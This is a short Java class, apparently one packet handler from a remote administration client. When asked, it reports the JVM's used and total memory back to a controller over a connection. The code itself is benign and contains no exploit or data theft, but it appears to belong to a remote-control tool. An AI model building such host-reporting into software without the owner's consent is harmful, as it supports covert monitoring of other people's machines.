package com.redpois0n.packets;

import com.redpois0n.Connection;

public class PacketGETRAM extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		Runtime rt = Runtime.getRuntime();
		long usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024L / 1024L;
		long totalMB = rt.totalMemory() / 1024L / 1024L;
		
		Connection.addToSendQueue(new PacketBuilder(Header.RAM, new Long[] { usedMB, totalMB }));
	}

}
